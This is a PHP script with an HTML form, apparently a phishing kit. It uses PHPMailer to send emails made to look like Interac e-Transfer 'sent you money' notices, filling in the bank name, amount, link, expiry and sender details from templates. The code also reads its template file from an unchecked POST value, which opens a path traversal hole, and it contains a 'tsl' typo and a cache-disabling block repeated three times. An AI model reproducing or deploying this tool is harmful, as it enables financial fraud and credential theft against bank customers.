<?php


use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;


require ("PHPMailer/src/PHPMailer.php");
require ("PHPMailer/src/SMTP.php");
require ("PHPMailer/src/Exception.php");


$template = file_get_contents('templates/'.$_POST['template']); // use selected template
$message = str_replace('{{line}}', $_POST['line'], $template);
$message = str_replace('{{username}}', $_POST['username'], $message);
$message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
$message = str_replace('{{bank}}', $_POST['bank'], $message);
$message = str_replace('{{amount}}', $_POST['amount'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message);
$message = str_replace('{{line}}', $_POST['line'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{photo_link}}', $_POST['photo_link'], $message);
$message = str_replace('{{sender_name}}', $_POST['sender_name'], $message);
$message = str_replace('{{receivers_name}}', $_POST['receivers_name'], $message);
$message = str_replace('{{receivers_email}}', $_POST['receivers_email'], $message);


$mail = new PHPMailer();
$mail->IsSMTP();
$mail->SMTPSecure = 'tsl';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port'];
$mail->Body = $message;
$mail->SMTPAuth = true;
$mail->Username = $_POST['username'];
$mail->Password = $_POST['password'];
$mail->SetFrom('<smtp@email.com>', $_POST['sender_name']);
$mail->AddAddress($_POST['receivers_email']);
$mail->Subject = 'INTERAC e-Transfer: '.$_POST['sender_name'].' sent you money.';
$mail->IsHTML(true);
$mail->CharSet="utf-8";


if(!$mail->Send()) {

echo "Mailer Error: " . $mail->ErrorInfo;
}


?>

<!DOCTYPE html>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html>
<head>
	<meta charset="utf-8">
	<title>PHPMailer HTML Form</title>
</head>
<body>

	<h1>PHPMailer HTML Form</h1>

	<form action="submit3.php" method="post">

		<label for="template">Template:</label>
		<select name="template" id="template">
			<option value="template1.html">Template 1</option>
			<option value="template2.html">Template 2</option>
			<option value="template3.html">Template 3</option>
		</select>
		<br><br>

		<label for="username">Username:</label>
		<input type="text" name="username" id="username">
		<br><br>

		<label for="photo_href">Photo Href:</label>
		<input type="text" name="photo_href" id="photo_href">
		<br><br>

		<label for="bank">Bank:</label>
		<input type="text" name="bank" id="bank">
		<br><br>

		<label for="amount">Amount:</label>
		<input type="text" name="amount" id="amount">
		<br><br>

		<label for="link">Link:</label>
		<input type="text" name="link" id="link">
		<br><br>

		<label for="EXPIRE">Expire:</label>
		<input type="text" name="EXPIRE" id="EXPIRE">
		<br><br>

		<label for="line">Expire Date:</label>
		<input type="text" name="line" id="line">
		<br><br>

		<label for="photo_link">Photo Link:</label>
		<input type="text" name="photo_link" id="photo_link">
		<br><br>

		<label for="sender_name">Sender Name:</label>
		<input type="text" name="sender_name" id="sender_name">
		<br><br>

		<label for="receivers_name">Receiver Name:</label>
		<input type="text" name="receivers_name" id="receivers_name">
		<br><br>

		<label for="receivers_email">Receiver Email:</label>
		<input type="email" name="receivers_email" id="receivers_email">
		<br><br>

		<label for="host">Host:</label>
		<input type="text" name="host" id="host">
		<br><br>

		<label for="port">Port:</label>
		<input type="text" name="port" id="port">
		<br><br>

		<label for="username">Username:</label>
		<input type="text" name="username" id="username">
		<br><br>

		<label for="password">Password:</label>
		<input type="password" name="password" id="password">
		<br><br>

		<input type="submit" value="Send Email">

	</form>

</body>
</html>